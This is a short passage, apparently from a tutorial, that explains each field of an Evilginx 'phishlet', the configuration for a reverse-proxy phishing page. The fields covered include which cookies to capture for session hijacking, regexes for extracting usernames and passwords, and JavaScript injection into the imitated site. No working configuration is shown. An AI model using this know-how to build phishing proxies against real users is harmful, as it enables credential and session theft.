**Explanation of Phishlet Parameters:**

- `name:` Identifies the name of the phishlet.
- `author:` Specifies the phishlet author.
- `min_ver:` Specifies the minimum Evilginx version that is compatible with your phishlet.
- `proxy_hosts:` Indicates the domain and subdomains to proxy. The `phish_sub` is the subdomain that the phishing page will imitate.
- `sub_filters:` Allows the phishlet to replace instances of the actual domain name with the phishing domain, which is critical for the phishing page to function correctly.
- `auth_tokens:` Identifies the cookies that should be captured from the victim's browser to gain access to the victim's session.
- `creds:` This field determines the credentials that the phishlet is engineered to steal. The `key` is the name of the credential (like username or password) and `search` is a regular expression that the program will use to identify and extract these details from the user's input.
- `auth_urls:` Defines the URLs that Evilginx will treat as the authenticated URLs. After the victim logs in, Evilginx will look out for a redirect to one of these URLs, at which point it will steal the listed `auth_tokens`.
- `login:` Here you specify the identifiers of the username and password fields in the login form on the original webpage. The `url` is the link of the page where the victim enters their credentials.
- `force_post:` If set to true, it forces the alteration of HTTP method from GET to POST.
- `is_landing:` If set to true, it means that the page is a landing page for the phishing attack.
- `js_inject:` This is where you can write some JavaScript to be injected in the webpage. It's typically used to enhance the phishing attack and ensure a smoother victim experience.
- `domain:` This is a template variable used to replace target hostname used in phishlet configuration.
